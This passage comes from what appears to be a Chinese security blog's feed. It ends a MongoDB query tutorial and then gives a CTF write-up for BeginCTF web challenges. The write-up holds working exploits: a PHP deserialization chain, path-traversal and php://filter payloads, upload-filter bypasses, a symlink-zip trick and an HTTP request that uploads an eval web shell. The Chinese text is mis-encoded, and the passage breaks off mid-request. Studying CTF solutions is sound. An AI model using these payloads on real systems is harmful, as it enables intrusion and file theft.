title="OR"></a>OR</h3><p>è¯­æ³•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.col.find(</span><br><span class="line">   &#123;</span><br><span class="line">      $<span class="keyword">or</span>: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(</span><br><span class="line">&#123;</span><br><span class="line">$<span class="keyword">or</span>: [</span><br><span class="line">&#123;&quot;age&quot;:<span class="number">20</span>&#125;, &#123;&quot;status&quot;:&quot;B&quot;&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">è¾“å‡º:</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ANDä¸ORè”åˆ"><a href="#ANDä¸ORè”åˆ" class="headerlink" title="ANDä¸ORè”åˆ"></a>ANDä¸ORè”åˆ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:<span class="number">19</span>&#125;, $<span class="keyword">or</span>: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)</span><br></pre></td></tr></table></figure><p>è¿™ç›¸å½“äº</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> age <span class="operator">&gt;</span> <span class="number">19</span> <span class="keyword">AND</span> (name<span class="operator">=</span><span class="string">&#x27;whoami&#x27;</span> <span class="keyword">OR</span> status<span class="operator">=</span><span class="string">&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å®‰è£…MongoDB&quot;&gt;&lt;a href=&quot;#å®‰è£…MongoDB&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…MongoDB&quot;&gt;&lt;/a&gt;å®‰è£…MongoDB&lt;/h1&gt;&lt;p&gt;MongoDB server:&lt;a href=&quot;https://www.mongod</summary>
      
    
    
    
    
    <category term="MongoDB" scheme="http://example.com/tags/MongoDB/"/>
    
    <category term="nosqlæ³¨å…¥" scheme="http://example.com/tags/nosql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰</title>
    <link href="http://example.com/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/"/>
    <id>http://example.com/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/</id>
    <published>2024-01-31T14:23:01.000Z</published>
    <updated>2024-02-06T08:19:14.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰"><a href="#BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰" class="headerlink" title="BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰"></a>BeginCTFï¼ˆè‡ªç”±èµ›é“ï¼‰</h1><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;p = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ç±»<code>B</code>ä¸‹é¢æ˜¯æ²¡æœ‰aå±æ€§çš„,ä½†æ˜¯ä¸å½±å“è§£é¢˜(ç”±äºphpç‰¹æ€§,ååºåˆ—åŒ–åä¼šè‡ªåŠ¨æ·»åŠ ç±»ä¸­ä¸å­˜åœ¨è€Œåºåˆ—ä¸­å­˜åœ¨çš„å±æ€§)</p><h2 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h2><p>ç›´æ¥ä¸Špayload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=../../../../flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h2><p>æºç ä¸­ç¦æ­¢å‡ºç°<code>..</code>å’Œ<code>/</code></p><p>æˆ‘ä»¬ç”¨ä¼ªåè®®è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=php://filter/read/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿé™„ä»¶ä¸­çš„æºç ,å®¹æ˜“å‘ç°ä»¥ä¸‹åœ°æ–¹å­˜åœ¨æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br></pre></td></tr></table></figure><p>åªéœ€è¦æ„é€ ä¸€ä¸ªæ–‡ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.zip.php</span><br></pre></td></tr></table></figure><p>ç»å¤„ç†åå¾—åˆ°çš„<code>$file_ext</code>å€¼ä¸ºâ€™zipâ€™,ä½†æ˜¯æ­¤æ–‡ä»¶åå°†ä¼šè¢«è§£æä¸ºphp</p><p>æ³¨: å‰ç«¯ä¸å…è®¸.phpç»“å°¾,åªéœ€è¦å°†.zipåç¼€çš„æ–‡ä»¶ä»£ç†åˆ°burpsuiteä¹‹åæ”¹ä¸º.zip.phpå³å¯</p><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>) &amp;&amp; (<span class="keyword">new</span> <span class="title class_">ZipArchive</span>())-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$file_tmp</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éªŒè¯æ–‡ä»¶åæœ€åä¸€ä¸ª<code>.</code>åçš„åç¼€åæ˜¯å¦ä¸ºzip, å¢åŠ äº†zipæ–‡ä»¶çš„æœ‰æ•ˆæ€§éªŒè¯,å¹¶å°†file_get_contentsæ”¹ä¸ºincludeå‡½æ•°</p><p>åªéœ€è¦å°†æ¶æ„phpæ–‡ä»¶å‹ç¼©ä¸ºzip,ç„¶åç›´æ¥åŒ…å«zipæ–‡ä»¶å³å¯</p><p>includeä¼šå°†zipæ–‡ä»¶è§£æä¸ºphp</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225145500.png" alt="image-20240131225145500"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225218914.png" alt="image-20240131225218914"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240201153444529.png" alt="image-20240201153444529"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><p>ä¼ è½¯é“¾æ¥çš„å‹ç¼©åŒ…</p><p>å‚è€ƒ:<a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/</a></p><p>è¿™é‡Œè¯•äº†å¥½å‡ æ¬¡ä¼ å®Œè½¯é“¾æ¥å†ä¼ shellæ²¡æˆåŠŸ,phpä¸èƒ½è¢«è§£æåªèƒ½file_get_contentsæŠŠphpçš„å†…å®¹å¸¦å‡ºæ¥</p><p>å®é™…ä¸Šæ ¹æœ¬æ²¡å¿…è¦rceé˜¿,ç”±äºçŸ¥é“flagå°±åœ¨&#x2F;flag,ç›´æ¥ä¼ ä¸ªè½¯é“¾æ¥é“¾æ¥åˆ°æ ¹ç›®å½•å°±å¯ä»¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s / abc </span><br><span class="line">zip -y abc.zip abc</span><br></pre></td></tr></table></figure><p>ä¹‹åä¼ å…¥abc.zip,ç›´æ¥è®¿é—®&#x2F;uploads&#x2F;abc&#x2F;flagå³å¯å°†flagä¸‹è½½ä¸‹æ¥</p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>é¢é¢ è¾¹ç®€å•äº†</p><p>ç›´æ¥ç»•è¿‡å‰ç«¯å¯¹.zipçš„é™åˆ¶å°±å¯ä»¥ä¼ å…¥phpæ–‡ä»¶</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:31393</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://101.32.220.189:31393/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------18159431502352910098131068589</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>282</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:31393</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥cat &#x2F;flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145106152.png" alt="image-20240205145106152"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><p>ä¾ç„¶æ˜¯æ„é€ .zip.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:32767</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: 